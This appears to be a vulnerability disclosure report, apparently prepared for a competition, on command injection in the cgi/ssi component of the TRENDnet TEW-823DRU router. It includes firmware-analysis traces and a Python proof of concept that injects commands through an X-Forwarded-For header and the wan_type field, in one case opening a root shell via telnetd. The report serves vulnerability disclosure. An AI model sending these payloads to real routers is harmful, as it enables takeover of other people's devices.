# Technical Report: CVE-XXXX-XXXX: TEW-823DRU cgi/ssi Multi-Vector Command Injection

## Normalized Submission Metadata

| Field | Value |
|---|---|
| Vendor | TRENDnet |
| Product | TRENDnet TEW-823DRU AC3200 Router |
| Firmware / Version | v1.1.02b01 |
| Affected Component | cgi/ssi |
| Vulnerability Type | Command Injection / RCE |
| CWE | CWE-77 |
| CVSS | 9.8 Critical |
| Source Material | E:\competition\漏洞\vulns\vulns\vuln-823dru-ssi-command-injection |

## Executive Summary

The team-provided report describes a CVE-level vulnerability in TRENDnet TEW-823DRU AC3200 Router affecting cgi/ssi. The issue is categorized as Command Injection / RCE and is supported by the copied PoC and evidence files in this package.

## Original Technical Detail

The original report is embedded below for reviewer convenience. The untouched copy is also available at source/REPORT.original.md.

---

# CVE-XXXX-XXXX: TEW-823DRU cgi/ssi Multi-Vector Command Injection

| 厂商 TRENDnet | 产品 TEW-823DRU v1.1.02b01 | CWE-77 | CVSS **9.8** |

## FirmRec 验证

```
0x40EBA8: frame=168B $ra@sp+164 — getenv("wan_type") → system() ★ 3 ra-loads
0x41BED0: frame=720B $ra@sp+716 — getenv("REMOTE_ADDR") → popen() ★
0x4164D0: frame=184B $ra@sp+180 — nvram_get("wan_eth") → system() ★ 2 ra-loads
```

共 **20 个独立注入点**，覆盖：wan_type, REMOTE_ADDR, ping6_ipaddr, hnat_lan_pc_ip, lan_ipaddr, ipv6_dhcp_pd_* 等。Simexp: 553 日志击中 0x41414141。

## PoC
```python
import requests
# REMOTE_ADDR → popen() 注入
requests.get("http://TEW-823DRU/cgi-bin/ping.cgi",
    headers={"X-Forwarded-For": "127.0.0.1; telnetd -p 9999 -l /bin/sh;#"})
# wan_type → system() 注入
requests.post("http://TEW-823DRU/cgi-bin/wan.cgi",
    data={"wan_type":"static; id > /tmp/pwn;#"})
```

